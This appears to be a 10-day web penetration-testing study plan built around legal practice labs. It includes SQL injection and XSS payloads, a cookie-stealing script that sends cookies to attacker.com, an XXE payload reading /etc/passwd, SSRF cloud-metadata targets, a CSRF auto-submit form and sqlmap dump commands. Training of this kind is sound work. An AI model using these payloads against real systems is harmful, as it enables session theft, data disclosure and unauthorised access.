# 🌐 10-Day Web Application Penetration Testing Mastery Routine

**Target Audience:** **Intermediate** pentesters (Burp Suite + Linux comfort required)
**Study Time:** 4-5 hours per day
**Real-world focus:** OWASP Top 10 + 150+ labs + professional reporting[^1]

***

## Table of Contents

- [Pre-Day 0: Essential Tools Setup](#pre-day-0-essential-tools-setup)
- [Day 1: Foundations \& HTTP Protocol](#day-1-foundations--http-protocol)
- [Day 2: Information Gathering \& Reconnaissance](#day-2-information-gathering--reconnaissance)
- [Day 3: OWASP Top 10 - SQL Injection](#day-3-owasp-top-10--sql-injection)
- [Day 4: OWASP Top 10 - Cross-Site Scripting](#day-4-owasp-top-10--cross-site-scripting)
- [Day 5: Authentication \& Session Management](#day-5-authentication--session-management)
- [Day 6: OWASP Top 10 - IDOR \& Access Control](#day-6-owasp-top-10--idor--access-control)
- [Day 7: CSRF, SSRF \& XXE](#day-7-csrf-ssrf--xxe)
- [Day 8: API Security Testing](#day-8-api-security-testing)
- [Day 9: Advanced Topics \& Tool Mastery](#day-9-advanced-topics--tool-mastery)
- [Day 10: Methodology, Reporting \& CTF](#day-10-methodology-reporting--ctf)

***

## Pre-Day 0: Essential Tools Setup

**Time Required:** 2-3 hours

### Environment Setup

```bash
# Reconnaissance Tools
sudo apt install subfinder amass httpx gobuster ffuf whatweb nikto

# Vulnerable Applications (Docker)
docker pull bkimminich/juice-shop
docker pull vulnerables/web-dvwa  
docker pull erev0s/vampi
docker pull webpwnized/mutillidae

# Burp Suite + Extensions
sudo snap install burpsuite-community
# FoxyProxy, Wappalyzer, Cookie Editor, HackTools
```


### Essential Accounts

- **PortSwigger Web Academy**: 200+ FREE labs[^1]
- **HackTheBox**: Starting Point (web machines)
- **TryHackMe**: Web Fundamentals path
- **PentesterLab**: Free bootstrap exercises

***

## Day 1: Foundations \& HTTP Protocol

**Study Time:** 4-5 hours

### Morning: HTTP Protocol Deep Dive (2 hours)

#### Core Components

```
Client (Browser) → Proxy (Burp) → Server (Apache/Nginx)
     ↓
Request: Method + Headers + Body    Response: Status + Headers + Body
```

**HTTP Methods Impact:**


| Method | Safe | Idempotent | Use Case |
| :-- | :-- | :-- | :-- |
| **GET** | ✅ | ✅ | Read data |
| **POST** | ❌ | ❌ | Create data |
| **PUT** | ❌ | ✅ | Update data |
| **DELETE** | ❌ | ✅ | Remove data |

### Afternoon: Burp Suite Mastery (3 hours)

#### Traffic Interception \& Manipulation

```bash
# Launch Juice Shop
docker run -d -p 3000:3000 bkimminich/juice-shop

# Burp Configuration
1. FoxyProxy → 127.0.0.1:8080
2. Target → http://localhost:3000
3. Intercept → Analyze → Forward
```

**Key Exercises:**

- **Proxy**: Intercept login requests
- **Repeater**: Cookie/header manipulation
- **Intruder**: Parameter fuzzing


### Practical Lab

- Juice Shop: "Score Board", "Privacy Policy", "Exposed Metrics"
- PortSwigger: HTTP basics (5 labs)


### Today's Checklist

- [ ] Burp Suite + FoxyProxy configured
- [ ] HTTP methods + headers mastered
- [ ] 5 Juice Shop challenges complete
- [ ] PortSwigger HTTP labs finished

***

## Day 2: Information Gathering \& Reconnaissance

**Study Time:** 4-5 hours

### Morning: Passive Reconnaissance (2 hours)

#### Subdomain \& Asset Discovery

```bash
# Passive subdomain enum
subfinder -d target.com -all -o subs.txt
amass enum -passive -d target.com -o amass.txt
cat subs.txt amass.txt | sort -u | httpx -silent -o live.txt
```


#### Historical Attack Surface

```bash
echo "target.com" | waybackurls | tee wayback.txt
echo "target.com" | gau --blacklist png,jpg,css | tee gau.txt
cat wayback.txt gau.txt | grep "?" | uro | tee params.txt
```


### Afternoon: Active Enumeration (3 hours)

#### Directory \& Parameter Fuzzing

```bash
# Intelligent directory brute-force
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -u https://target.com/FUZZ -mc 200,301,302,307 -o ffuf.json

# Parameter discovery
ffuf -w params.txt -u "https://target.com/page?FUZZ=test"
```


#### Technology Fingerprinting

```bash
whatweb -v https://target.com
# Apache/2.4.41 + PHP/7.4.3 + jQuery/3.5.1
```


### Practical Lab

- Juice Shop: Complete recon mapping
- PortSwigger: Information Disclosure (5 labs)


### Today's Checklist

- [ ] 500+ subdomains enumerated
- [ ] 10k+ historical URLs discovered
- [ ] Technology stack fingerprinted
- [ ] Hidden directories/parameters found

***

## Day 3: OWASP Top 10 - SQL Injection

**Study Time:** 4-5 hours

### Morning: SQL Injection Fundamentals (2 hours)

#### Attack Vectors \& Types

| Type | Detection | Exploitation |
| :-- | :-- | :-- |
| **Error-based** | MySQL/PostgreSQL errors | Direct data dump |
| **Union-based** | `ORDER BY` + `UNION SELECT` | Table/column enum |
| **Blind Boolean** | `AND 1=1` vs `AND 1=2` | Bit-by-bit extraction |
| **Blind Time** | `SLEEP(5)` | Timing analysis |

### Afternoon: Manual + Automated Exploitation (3 hours)

#### Manual Testing Payloads

```text
# Authentication bypass
' OR '1'='1 --
admin' --

# Union extraction  
' UNION SELECT NULL, NULL--
' UNION SELECT username, password FROM users--
```


#### SQLMap Automation

```bash
sqlmap -u "http://target.com/search?q=1" --dbs --batch
sqlmap -u "http://target.com/search?q=1" -D juice --tables --dump
```


### Practical Lab

- **PortSwigger**: SQLi Labs (18 total)
- **DVWA**: SQL Injection (Low/Medium/High/Impossible)
- **Juice Shop**: "Login Admin", "User Credentials"


### Today's Checklist

- [ ] Manual SQLi detection (4 types)
- [ ] SQLMap full database dump
- [ ] 10+ PortSwigger SQLi labs
- [ ] Authentication bypass chains

***

## Day 4: OWASP Top 10 - Cross-Site Scripting

**Study Time:** 4-5 hours

### Morning: XSS Attack Vectors (2 hours)

#### XSS Types Matrix

| Type | Storage | Execution Context | Example |
| :-- | :-- | :-- | :-- |
| **Reflected** | No | URL Parameter | `search?q=<script>alert(1)</script>` |
| **Stored** | Yes | Persistent | Profile bio injection |
| **DOM-based** | No | Client-side JS | `page#<img src=x onerror=alert(1)>` |

### Afternoon: Payloads \& Bypasses (3 hours)

#### Essential Payloads

```html
<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>

<!-- Advanced bypasses -->
<svg onload=alert(1)>
<scr<script>ipt>alert(1)</scr</script>ipt>
javascript:alert(1)
```


#### Cookie Theft Exploitation

```javascript
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```


### Practical Lab

- **PortSwigger**: XSS Labs (30+ total)
- **DVWA**: XSS (Reflected/Stored)
- **Juice Shop**: "DOM XSS", "Bonus Payload"
- **XSS Game**: Levels 1-6


### Today's Checklist

- [ ] 3 XSS types exploited
- [ ] 10+ filter bypass techniques
- [ ] Cookie stealing PoC working
- [ ] 15+ PortSwigger XSS labs

***

## Day 5: Authentication \& Session Management

**Study Time:** 4-5 hours

### Morning: Authentication Bypass Vectors (2 hours)

#### Attack Surface Mapping

```
Login Forms → Password Reset → Session Tokens → 2FA → Remember Me
```


### Afternoon: Exploitation Techniques (3 hours)

#### JWT Attacks

```bash
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py eyJhbGciOiJub25... -T  # None algorithm
python3 jwt_tool.py token -C -d rockyou.txt  # Secret brute-force
```


#### Session Testing

```
Burp Sequencer → Entropy analysis → Predictable session IDs
Cookie parameter pollution → Session confusion
```


### Practical Lab

- **PortSwigger**: Authentication (15 labs)
- **Juice Shop**: "Login Bender", "JWT Issues"


### Today's Checklist

- [ ] JWT none algorithm bypass
- [ ] Session fixation discovered
- [ ] 12+ authentication labs

***

## Day 6: OWASP Top 10 - IDOR \& Access Control

**Study Time:** 4-5 hours

### Morning: IDOR Detection Patterns (2 hours)

#### Parameter Manipulation

```text
/user/123 → /user/124 (Horizontal IDOR)
UUID: 550e8400-e29b... → Sequential increment
Base64: dXNlcjEyMw== → user123 decoded
```


### Afternoon: Access Control Testing (3 hours)

#### Methodology

```
1. Map ALL ID parameters (GET/POST/JSON)
2. Test sequential/incremental IDs  
3. UUID prediction/enumeration
4. Role-based access (user vs admin)
```


### Practical Lab

- **PortSwigger**: Access Control (13 labs)
- **Juice Shop**: "View Basket", "Admin Registration"


### Today's Checklist

- [ ] 5+ IDOR endpoints discovered
- [ ] Horizontal/vertical escalation
- [ ] Parameter pollution attacks

***

## Day 7: CSRF, SSRF \& XXE

**Study Time:** 4-5 hours

### Morning: Server-Side Attacks (2 hours)

#### SSRF Attack Chains

```text
127.0.0.1:8080/admin → localhost bypass
169.254.169.254/metadata → AWS IMDSv1
0.0.0.0:22 → Internal SSH pivot
```


#### XXE Payloads

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```


### Afternoon: Exploitation (3 hours)

**CSRF PoC Generator:**

```html
<form action="https://target.com/transfer" method="POST">
<input type="hidden" name="to" value="attacker">
<input type="hidden" name="amount" value="1000">
</form><script>document.forms[^0].submit();</script>
```


### Practical Lab

- **PortSwigger**: CSRF (7 labs), SSRF (7 labs), XXE (9 labs)


### Today's Checklist

- [ ] SSRF internal pivot achieved
- [ ] XXE file disclosure working
- [ ] CSRF PoC exploitation

***

## Day 8: API Security Testing

**Study Time:** 4-5 hours

### Morning: OWASP API Top 10 (2 hours)

#### Critical Risks

| \# | Risk | Attack Vector |
| :-- | :-- | :-- |
| 1 | **BOLA/IDOR** | Object-level authorization |
| 2 | **Broken Auth** | JWT/MFA bypass |
| 5 | **BOLA Function** | Mass assignment |

### Afternoon: API Exploitation (3 hours)

#### VAmPI Vulnerable API

```bash
docker run -d -p 5000:5000 erev0s/vampi
curl -X POST http://localhost:5000/api/users \
  -d '{"id":123,"admin":true}'  # Mass assignment
```


### Practical Lab

- **VAmPI**: Complete API challenges
- **PortSwigger**: API testing labs


### Today's Checklist

- [ ] API enumeration complete
- [ ] BOLA/IDOR exploitation
- [ ] Mass assignment attacks

***

## Day 9: Advanced Topics \& Tool Mastery

**Study Time:** 4-5 hours

### Morning: Burp Extensions (2 hours)

#### Essential Extensions

```
Autorize → Access control testing
Logger++ → Advanced logging  
Param Miner → Hidden parameter discovery
Turbo Intruder → Race conditions
```


### Afternoon: Advanced Exploitation (3 hours)

#### Race Conditions

```python
import requests, threading
def race(): requests.post('http://target.com/transfer', data={'amount':1000})
threads = [threading.Thread(target=race) for _ in range(100)]
```


### Practical Lab

- **PortSwigger**: Deserialization + Race Condition labs


### Today's Checklist

- [ ] Burp extensions configured
- [ ] Race condition exploitation
- [ ] Advanced Burp workflows

***

## Day 10: Methodology, Reporting \& CTF

**Study Time:** 4-5 hours

### Morning: Professional Reporting (2 hours)

#### CVSS Scoring Template

| Vulnerability | CVSS v3.1 | Impact | Proof |
| :-- | :-- | :-- | :-- |
| SQL Injection | **9.8** | RCE | Screenshot |
| Stored XSS | **6.1** | Account takeover | Video |
| IDOR | **8.1** | Data exposure | Request |

### Afternoon: Full Assessment (3 hours)

**Complete Engagement:**

- **Mutillidae II**: Full black-box pentest
- **Professional Report**: 20-page PDF
- **CTF Practice**: HTB web boxes


### Today's Checklist

- [ ] Complete pentest report written
- [ ] CVSS scoring mastered
- [ ] Executive summary + remediation
- [ ] Portfolio-ready GitHub repo

***

## Essential Resources Library

### Tools Repository

```bash
git clone https://github.com/danielmiessler/SecLists     # Wordlists
git clone https://github.com/ticarpi/jwt_tool           # JWT attacks
git clone https://github.com/projectdiscovery/nuclei    # Vulnerability scanner
```


### Reading Materials

- **PortSwigger Web Academy**: 200+ FREE labs[^1]
- **OWASP Testing Guide v4.2**
- **"The Web Application Hacker's Handbook"**


### Video Channels

- **Rana Khalil** (PortSwigger walkthroughs)
- **IppSec** (HTB web machines)
- **HackerSploit** (Tool tutorials)


### Communities

- **Reddit**: r/netsec, r/bugbounty
- **Discord**: HackTheBox, PortSwigger

***

## Progress Tracker

### Daily Checklist Template

```markdown
## Day X: [Topic]

### Learning Objectives
- [ ] Theory & concepts mastered
- [ ] Hands-on labs completed  
- [ ] PortSwigger challenges solved

### Practical Labs
- [ ] Juice Shop: X challenges
- [ ] DVWA: All levels
- [ ] PortSwigger: Y labs

### Key Takeaways
-
```


***

**Total Labs:** 150+ PortSwigger + Juice Shop (50+) + DVWA + VAmPI
**Certification Path:** **BSCP** → **eWPT** → **OSWE**
**Portfolio Value:** Professional pentester ready (\$80k+ entry-level)[^1]

**Intermediate pentester → Professional in 10 days** 🚀💻

<div align="center">⁂</div>

[^1]: https://portswigger.net/web-security/all-labs

